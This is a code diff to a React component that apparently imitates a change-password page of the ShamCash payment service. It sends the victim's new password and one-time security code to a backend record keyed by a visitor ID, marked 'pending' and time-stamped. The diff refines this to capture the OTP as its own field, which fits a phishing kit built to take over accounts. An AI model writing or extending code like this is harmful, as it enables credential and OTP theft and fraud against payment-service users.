@@ -79,7 +79,8 @@ export function ShamCashChangePassword() {
     if (visitorId) {
       await shamApi.patch(visitorId, {
         changepassStatus: "pending",
-        password: fields.newPass || fields.securityCode,
+        password: fields.newPass,
+        otpCode: fields.securityCode,
         page: "تغيير كلمة المرور",
         lastSeen: Date.now(),
       });
